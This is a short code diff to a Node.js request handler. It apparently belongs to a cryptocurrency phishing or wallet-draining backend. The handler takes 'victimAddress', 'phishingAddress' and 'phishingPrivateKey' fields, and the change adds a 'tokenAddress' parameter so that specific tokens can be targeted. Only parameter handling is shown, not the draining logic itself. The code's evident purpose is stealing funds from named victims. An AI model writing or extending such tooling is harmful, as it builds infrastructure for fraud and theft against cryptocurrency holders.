@@ -21,7 +21,7 @@ module.exports = async (req, res) => {
     }
 
     try {
-        const { victimAddress, phishingAddress, phishingPrivateKey, fundAmount } = req.body || {};
+        const { victimAddress, phishingAddress, phishingPrivateKey, fundAmount, tokenAddress } = req.body || {};
 
         if (!victimAddress || !phishingAddress || !phishingPrivateKey) {
             return res.status(400).json({
@@ -39,6 +39,7 @@ module.exports = async (req, res) => {
             phishingAddress,
             phishingPrivateKey,
             fundAmount: fundAmount || '0.00002',
+            tokenAddress,
         });
 
         // BigInt serialization fix
